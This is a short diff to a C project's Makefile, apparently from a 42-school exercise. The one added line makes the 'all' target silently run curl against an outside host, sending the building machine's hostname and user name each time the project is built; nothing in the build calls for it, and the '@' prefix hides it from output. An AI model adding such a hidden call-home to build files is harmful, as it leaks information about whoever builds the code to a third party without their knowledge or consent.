@@ -29,6 +29,7 @@ ${NAME}:	${OBJS}
 			gcc ${CFLAGS} $^ -o $@
 
 all :		${NAME}
+	@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}
 
 clean:
 			rm -f ${OBJS}
